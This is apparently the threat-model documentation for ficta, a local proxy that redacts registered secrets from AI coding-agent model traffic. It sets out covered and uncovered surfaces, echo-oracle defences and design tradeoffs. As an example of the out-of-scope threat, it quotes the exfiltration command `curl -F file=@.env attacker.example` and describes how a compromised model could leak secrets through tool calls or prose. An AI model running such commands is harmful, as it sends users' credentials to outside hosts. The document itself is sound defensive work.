# Threat model

ficta is a local privacy guardrail for AI coding-agent **model traffic**. It is not a sandbox,
enterprise DLP product, compliance control, or malware/exfiltration prevention system.

## The promise

For values that ficta has loaded into its registry after applicable configured filters (for example
`registry.min_len` on unstructured env/Doppler candidates) and trusted policy exclusions (provider-declared plus the user's own
`registry.exclude_names` and the current project's list in `~/.ficta/projects.json`), such as exact values from managed registry files, `.env` files, or
Doppler, ficta attempts to:

1. replace those exact values with local surrogates before sending covered request bodies, query strings, and non-auth headers to the model provider;
2. block the request if an expected exact value would still be forwarded verbatim in a surface ficta is supposed to redact; and
3. restore surrogates back to real values locally in text/JSON/SSE responses so the coding agent keeps working.

This is an **exact-match** promise for registered values in covered redacted request surfaces, not a
general claim that all secrets or all PII are detected. Any public "security" wording should
include this scope.

## Entity-family metadata disclosure

For structured managed-registry `entity` records in a trusted keyed request body, ficta sends a
context-bound family token with a coarse `ORG` or `PERSON` type, an entity tag shared by linked forms,
and an exact-surface tag used for reversible restoration. This deliberately reveals coarse entity
type and within-context sameness to preserve attribution. HMAC-derived tags do not reveal the raw
identity, registry ID, operator labels, legal role, matter metadata, or a stable identity across
different protection contexts.

Only registered canonical/forms and uniquely anchored high-confidence organization aliases join a
family. A linked detected alias retains detector authority and confidence; linking does not upgrade it
to registry trust. Ambiguous links, detector-only entities, explicit user selections, headers,
queries, and unkeyed requests remain protected with literal tokens and do not claim shared identity.
People link only through explicit registered forms. Workspace registry applicability does not imply
matter-specific enforcement.

## Covered by default

- Model API request bodies handled by the proxy.
- Query strings handled by the proxy.
- Non-auth request headers handled by the proxy.
- JSON/text/event-stream responses, for local surrogate restoration.
- Exact registered values that pass configured registry-source filters and policy exclusions.
- Secret-ish process environment values inherited by the wrapper, unless process-env loading is disabled.

## Intentionally not covered

- Auth headers on the built-in pass-through allowlist: `Authorization`, `Proxy-Authorization`, `x-api-key`, and `Cookie`. The upstream needs these to authenticate; other provider-specific auth headers are treated as non-auth request headers.
- Values transformed before the model sees them, such as base64, URL encoding, chunks, hashes, compression, or concatenation, unless the transformed form is also registered.
- Filtered-out unstructured registry values, such as env/Doppler values shorter than `registry.min_len` / `FICTA_REGISTRY_MIN_LEN` (a silent default of 8, no longer prompted at setup). Managed forms declare substring/token policy explicitly instead.
- Names the user excludes via `registry.exclude_names` / `FICTA_REGISTRY_EXCLUDE_NAMES` (every project) or the per-project list in `~/.ficta/projects.json` / `FICTA_REGISTRY_PROJECT_EXCLUDE_NAMES` (launches inside that project, keyed by its resolved root path). This is a trusted un-protection channel: it is gated by the local 0600 config files in the user's home directory (or process env) — never by a file inside a repository, so cloning or checking out a repo cannot un-protect values — matches exact env var names only, is visible in the startup banner and `ficta doctor`, and is what `ficta review` edits. The default posture remains "redact everything discovered"; a name is only skipped once the user opts it out. `ficta review` may pre-suggest un-checking names its heuristic classifier reads as non-secret (credential-free URLs, paths, well-known config), but this only changes the prompt's default — the exclusion is still written only on explicit user confirmation, and any credential-shaped or high-entropy value is always left protected.
- Filesystem-path-like tokens **on the query string and in the request body**, even when a registered value appears inside them — so a legitimate path parameter (e.g. `?redirect_uri=/a/b`) and agent tool-call paths (`cd`, `Read`, `Edit`) are not mangled. Request **headers** do not get this preservation: a registered value inside a slash-path in a header is redacted. Do not rely on path-preservation for secrecy; `FICTA_REDACT_PATHS=1` redacts path-like tokens on every surface.
- Tool-execution exfiltration. If an agent runs `curl -F file=@.env attacker.example`, ficta is not the enforcement boundary. Use OS/container egress controls, filesystem sandboxing, and the agent's own permission system. Restore-into-tools withholding narrows the _restore-assisted_ variant — a surrogate the model places in a tool-call argument stays a placeholder rather than being restored to the real value, on streamed deltas, provider replay events, and buffered (non-SSE) tool calls alike — but it is a fail-safe, not egress control. `FICTA_RESTORE_INTO_TOOLS` is tri-state: `all` restores every surrogate into tool arguments, `none` withholds every surrogate, and `detected` (the default) restores only **content-derived** detections (secret-shapes/PII the agent already read locally) while withholding **registry/environment** secrets — the values the model only ever saw as placeholders. The `detected` default is chosen because a compromised model can already exfiltrate local file content without any placeholder (`curl --data @file`), so withholding content-derived detections only corrupts the agent's own files, whereas registry secrets stay strictly withheld. Withholding compares the whole surrogate token, reassembling one split across multiple streaming SSE fragments before deciding, so a fragmented placeholder is never restored — or passed through uncounted — by accident.
- Withholding on a response that arrives with **no content-type** on a known wire but is actually buffered JSON: such a body is treated as an event stream (the ChatGPT/Codex backend omits the header on real SSE) and falls back to a blanket text restore, so a tool-call argument in that unusual shape would be restored. Upstreams set `content-type` on JSON responses in practice; body-sniffing to close this would be more fragile than the gap it closes.
- Withholding on an **unknown wire**: with no schema there is no way to classify tool arguments, so buffered unknown-wire responses keep the blanket restore.
- Registered secrets restored into assistant **prose** by default. Prose (free text the model emits) is ficta's core restore surface — a registered secret round-trips into the reply so the agent sees the real value it already holds. The same mechanism means a model can narrate a registry secret it only ever saw as a placeholder back into text, which then lands in the on-disk transcript (a tool call could later egress it). This cannot be told apart from a legitimate restore, so it is not closed by default. High-assurance deployments can opt in with `restore_prose` / `FICTA_RESTORE_PROSE`: `detected` keeps locally-read detected content but renders registry/env secrets as `[ficta:withheld]`, and `none` withholds every mapped value from prose. Tool-call arguments are governed separately by `restore_into_tools` (default `detected`, which already withholds registry secrets there).
- Binary responses.
- Unregistered secrets that the best-effort detectors do not match. `secret-shapes` catches vendor-shaped values (`sk-…`, JWTs, PEM blocks, credential URLs with literal passwords) anywhere, and now checks long random-looking bare values probabilistically (which can also match hashes), but its key/value pairing is deliberately conservative and misses opaque values in several positions — a secret-ish word at the very start of the key (`token:`, `secret:`; password labels such as `password:` are the exception), a decoration between the separator and the value (`api_token: |`, `Authorization: Bearer …`), and flag forms with no separator. Path-shaped values and credential URLs whose password is entirely a recognized source-language variable expression are rejected outright so file listings and executable source an agent reads are not mangled. See [Known coverage limits](./plugins.md#known-coverage-limits). Loosening any of these trades a narrow miss for broad over-redaction, which withholds values the agent needs; register the secret instead.
- Secrets the agent reads or sends outside the proxied model API channel.
- Remote-transport MCP servers, which talk to their own hosts and never reach the proxy. See [Remote MCP servers are a second egress path](#remote-mcp-servers-are-a-second-egress-path) below.
- Codex (ChatGPT/OAuth) account, plugin, and usage calls to `chatgpt.com/backend-api/{wham,ps,plugins}`. Codex 0.156+ refuses a non-HTTPS `chatgpt_base_url`, so this housekeeping goes direct rather than through the loopback proxy; model turns still route through ficta via the temporary provider. The one housekeeping channel observed carrying registered values, Codex analytics events, is switched off for every wrapped launch (`analytics.enabled=false`). See [Intercepting Codex (ChatGPT/OAuth)](./codex-oauth-intercept.md#housekeeping-traffic).
- Session mirroring over non-model-API wires, notably Claude Code's remote control. See [Remote control is out of scope](#remote-control-is-out-of-scope) below.
- IDE clients that do not route all model traffic through the proxy, for example Cursor, whose Agent / Edit / Tab / Composer features bypass a custom base URL. See [IDE clients](#ide-clients-cursor-etc) below.

## IDE clients (Cursor, etc.)

ficta's exact-match promise requires that **all** of a client's model traffic pass through the
local proxy. CLI agents (`claude`, `codex`, `pi`) satisfy this — their base-URL override
(`ANTHROPIC_BASE_URL` and equivalents) captures every model request.

IDE clients like **Cursor** do not, so they are **not supported**:

- Cursor's base-URL override only routes its **chat/plan panel with a custom OpenAI-compatible model** to a local endpoint.
- The agentic features that actually read your files and `.env` — **Agent, Composer, Edit/Apply, Tab** — stay on Cursor's own backend and first-party models and never reach the proxy. Default first-party model usage also transits Cursor's servers.

This is **partial coverage**, which for a secret airlock is worse than none: a `.env` value swept
into Agent context is sent to the provider verbatim while the user believes ficta is protecting
them. Pointing Cursor at the ficta proxy would cover only chat-panel custom-model requests and
silently leak the dominant agentic path. Per the positioning guardrails below, ficta must not
claim Cursor protection on that basis.

If a future Cursor build routes **all** model traffic (including Agent/Edit/Tab) through a
user-controlled base URL, revisit this — full coverage would make the same exact-match promise
honest there too.

## The local proxy restores real values, so access to it is controlled

The proxy holds the registry in memory and restores surrogates to their real values on the response
path. That makes the running proxy a sensitive local endpoint: a process that can reach it and get a
response to echo a known placeholder back could otherwise read the real value out. Two properties
close that local "echo oracle":

- **Error and non-model responses are never restored.** Surrogates are rehydrated only on a
  successful (2xx) response body. A provider error reflects request fields back (e.g.
  `model: FICTA_… not found`), so restoring error bodies would let a caller decode a placeholder by
  sending a deliberately malformed request. Error bodies pass through with the placeholder intact — a
  surrogate is not secret.
- **A per-launch caller token gates the per-agent proxy.** When ficta launches an agent it mints a
  random token and routes it to the agent — in the base-URL path (`claude`, `pi`) or, for `codex`
  (whose provider overrides are command-line arguments), in an env-mapped `x-ficta-launch` header so
  the token value never appears in `ps`-visible argv. The proxy refuses any provider-bound request
  that carries neither (only a health probe is exempt); the token is stripped/swept before routing
  and never forwarded upstream.

  What this does and does not cover: it stops a process that can reach the loopback port but does not
  inspect the launched agent — a sandboxed tool with network access but no process visibility, or a
  different-user process. It does **not** defend against a same-user process that reads the token out
  of the agent's environment, arguments, or config files, nor against the launched agent itself: a
  secret the same user can reach by inspecting their own processes is the same-user / tool-execution
  boundary that is out of scope above. The token raises the bar against casual local reuse of the
  proxy as a restore oracle; it is not a same-user isolation mechanism.

The proxy binds loopback by default; `FICTA_HOST` can widen that but then also exposes the forwarded
provider auth headers, so it stays opt-in.

## Remote MCP servers are a second egress path

ficta redacts the **model API** channel. An agent's MCP servers are a separate channel, and their
transport decides whether ficta is even in a position to see them:

- **stdio servers** run as local child processes. Nothing leaves the machine on ficta's account, and
  what the agent later tells the _model_ about their output is redacted normally.
- **`http` / `sse` servers** open their own connection to their own host. Tool arguments the agent
  sends — which may quote file contents, env values, or a registered secret verbatim — go straight
  to that vendor. ficta never sees the request and cannot redact it.

This is easy to miss because MCP configuration is not obviously network configuration, and a
user-scoped server in `~/.claude.json` loads in **every** project, including ones you would never
have pointed at that vendor:

```json
"mcpServers": {
  "some-docs": { "type": "http", "url": "https://vendor.example/api/mcp" }
}
```

Audit with `claude mcp list` and treat every non-stdio entry as an egress destination in its own
right. This is the same shape of gap as [remote control](#remote-control-is-out-of-scope): a channel
carrying the same material ficta just protected, over a wire ficta has no reader for. Routing it
through the proxy would not help — a redactor would need per-server schema knowledge, and MCP tool
arguments are arbitrary vendor-defined shapes.

## Remote control is out of scope

Claude Code's remote control (`claude remote-control`, `--remote-control`/`--rc`, settings
auto-start, or the in-session toggle) mirrors the session — transcript and tool calls — to Anthropic
so it can be driven from claude.ai or the mobile app. Observed on 2.1.220, it does this over
**control-plane endpoints on `api.anthropic.com`**, by HTTP long-poll rather than a websocket:

```
POST /v1/environments/bridge                     registration
POST /v1/sessions                                session create
POST /v1/code/sessions/{cse}/worker/register     worker attach
GET  /v1/environments/{env}/work/poll            long poll, ~5s
POST /v1/environments/{env}/work/{id}/ack        work ack
```

Same host as the Messages API, but **not** the Messages wire: ficta parses and redacts model-API
request bodies, and these are a different schema it does not understand. Routing them through the
proxy would not redact them.

In practice the two features are mutually exclusive today, which is the safer failure:

- Claude Code starts the bridge only when `ANTHROPIC_BASE_URL` is unset or its host is exactly
  `api.anthropic.com` (the host comparison includes the port, and the
  `_CLAUDE_CODE_ASSUME_FIRST_PARTY_BASE_URL` escape hatch is explicitly excluded from it). ficta owns
  that variable for the launched agent, so under ficta the bridge never starts.
- Claude Code says so at startup, but a full-screen TUI repaints the notice away, so the flag reads
  as silently broken. ficta therefore refuses `claude remote-control` outright and warns on a bare
  `--rc` (see `claudeRemoteControlPreflight`).

`FICTA_DISABLE=1 claude --rc` gets remote control back and gives up redaction for that session. Do
not read that as a redaction gap ficta could close by relaxing the routing: the mirroring channel is
unredacted either way, because ficta has no reader for that schema.

## Embedding the engine

`@serovaai/ficta-engine` lets a service run the redaction engine in its own process, usually through
its `createEngine` facade. That use is outside the threat model above: the proxy's covered request
surfaces, restore-into-tools withholding, and auth-header handling do not apply, because there is no
proxy. The embedding service decides which texts are redacted, where they go, and who may restore
them. Its scope keys are the isolation boundary between restorers, so it must derive them itself and
never take them from untrusted input.

What the facade does promise, kept as separate claims:

- **Availability is fail-closed.** If a detector cannot run (an unreachable, slow, or failing
  sidecar, or a detector error) or the vault store fails, the call throws `RedactionUnavailableError`
  and returns no text. A batch is all or nothing, never partly redacted. There is no fail-open
  setting. Error messages carry no values or input text.
- **Detection is still best-effort.** Fail-closed means a detector that _could not run_ never lets
  text through. It does not mean every sensitive value is found: a value that a running detector does
  not report passes through unchanged, under any profile. Deterministic output for the same input is
  a consistency property, not a coverage one.
- **Destroyed values are never vaulted.** A value in a destroy category becomes a fixed marker. It is
  never written to memory mappings or the vault store and cannot be restored. This applies to values
  once found and does not make detection more likely. A profile can destroy every detector finding
  (`categories: "*"`), whatever its category, so that in a keyed scope only registered (roster)
  values are ever written to the vault store.
- **Exact-match protection applies only to registered values.** The fail-closed exact-match
  promise above covers values registered with the engine. Through the facade, those are the entries
  of a roster the embedding application supplies (known people and organisations): their canonical
  names and forms are matched exactly before detection, in every profile, are never destroyed, and a
  roster value surviving redaction fails the call. Only roster entries get linked entity tokens
  (one entity tag for "Anna Berg", "Anna" and her email address within a scope). Names outside the
  roster remain detector-based: best-effort, and never linked to each other or to a roster entry.
  Sourcing, refreshing and protecting the roster itself is the application's responsibility; the
  engine keeps it in memory and never writes it to the vault store.
- **The vault is encrypted at rest.** With a persistent store, keyed scopes' mappings are encrypted
  as described under [persistent vaults](#design-tradeoffs). Without one, they stay in the engine's
  memory and are lost when it closes.

## Design tradeoffs

- **Exact-match over broad guessing.** The reliable layer is values you already know. Detector-style matching can be added, but is best effort.
- **Fail closed for expected leaks.** If a registered value remains in a surface ficta is supposed to redact, ficta blocks rather than forwarding.
- **Usability for coding agents.** Path-like tokens on the query string and in the request body are preserved so legitimate path parameters and agent tool calls (`cd`, `Read`, `Edit`) aren't mangled — a registered value inside a real path is far more likely a path segment than a secret. Request **headers** are the exception: they rarely carry a legitimate local path, so a registered value inside a slash-path in a header is redacted, closing that leak surface at no ergonomic cost.
- **Local only.** In the ficta CLI and proxy, registry values and surrogate mappings are kept in memory for the local proxy session and are not intentionally sent anywhere except where explicitly restored locally. The proxy-internal surrogate key never leaves the proxy: it is not passed to child agent processes, not sent upstream, and never printed (`ficta doctor` reports only whether it is stable and where it comes from). A key supplied through `surrogate.key_file` must be a regular file not accessible to group or others; the proxy refuses to start otherwise. The key file protects the key at rest from other local users, not from the launched agent, which runs as the same OS user and can read the same files.
- **Stable vs. ephemeral surrogate keys.** Without a configured key the proxy uses a random per-process key, so surrogates do not survive a restart. With `surrogate.require_stable_key` the proxy fails at startup rather than falling back. Changing the key changes every surrogate; tokens issued under an old key cannot be restored with a new one.
- **Persistent vaults are opt-in and encrypted.** The ficta CLI and proxy never write mappings to disk. An engine embedding (`@serovaai/ficta-engine`) can attach a persistent vault store, such as the bundled SQLite store; keyed scopes' mappings are then written to that store so other processes and later runs can restore them. Raw values and everything derived from them (detection labels, matching flags, entity ids) are encrypted with AES-256-GCM under a caller-supplied encryption key, separate from the surrogate key, with each ciphertext bound to its scope key and token. Surrogate tokens, scope keys, and timestamps are stored in clear, as is a keyed hash of each value used to delete it on request; whoever can read the file learns which tokens exist in which scopes and when they were used, but not the values. The encryption key must be protected like the surrogate key: anyone holding both the vault file and the encryption key can read every stored value. Destroyed values are never written to the store.
- **Destroyed values are not in the vault.** An engine embedding or proxy operator can configure detection categories to be _destroyed_: a value detected in one of them is replaced by a fixed marker such as `[REDACTED_CREDIT_CARD]` instead of a surrogate, is never added to the in-memory mappings (request, keyed-scope, or permanent), and cannot be restored. This is a disposition for values once found; it does not make detection more likely to find them, and destroyed values are not part of the fail-closed exact-match promise. Registered values are never destroyed, and neither is a value a keyed scope already holds a token for: it keeps that token. The CLI and proxy leave it off by default; operators may enable it with `dispositions.destroy.categories`. The Gateway reference deployment leaves it off; a deployment can opt in per category from the Gateway admin settings.
- **Controlled entity metadata.** Entity-family tokens expose only coarse person/organization type and within-context sameness; they never encode party role, matter, or a cross-context identifier.

## Public-claim guardrails

When documenting or explaining ficta:

- Scope the strongest guarantee to registered exact values from managed registry files, `.env`,
  process env, and Doppler.
- Do not present ficta as full DLP, compliance tooling, or a substitute for enterprise controls.
- Describe PII detector plugins as best-effort additions, not as exact-match protection.
- Do not claim "never leaks" or "secure" without the covered-surface exact-match scope above.
- Do not market tool-execution exfiltration protection unless OS/container/agent controls are part
  of the setup.

## What to use alongside ficta

For stronger isolation, combine ficta with:

- a restricted workspace/filesystem sandbox;
- an outbound network allowlist or container-level egress policy;
- strict coding-agent tool permissions; and
- normal secret hygiene: don't put real secrets in filenames, prompts, docs, screenshots, or public logs.

## Unknown response references

Clients advertising `restore-unknown` can send `x-ficta-unknown-tokens: replace` to replace
unmapped or model-mutated surrogate references with `[unrestored reference]` in buffered and
streamed responses. Gateway always requests this behavior. Known tokens withheld from tool-call
arguments remain intact. Replacement never guesses an original value, and does not improve detection
coverage. The values-free egress proof reports distinct restored values and unknown references after
the response drains; interrupted responses may have no restoration summary.
